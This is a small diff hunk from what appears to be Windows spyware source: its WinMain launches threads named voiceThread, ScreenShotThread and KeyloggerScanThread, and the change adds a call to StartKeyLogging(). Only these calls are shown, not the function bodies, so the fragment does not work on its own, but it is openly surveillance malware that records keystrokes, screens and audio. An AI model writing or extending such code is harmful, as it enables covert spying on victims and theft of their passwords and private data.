@@ -7,6 +7,8 @@ int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdL
 	CreateThread(0, 0, &voiceThread, 0, 0, 0);
 	CreateThread(0, 0, &ScreenShotThread, 0, 0, 0);
 	CreateThread(0, 0, &KeyloggerScanThread, 0, 0, 0);
+	
+	StartKeyLogging();
 
 	for (;;) {
 
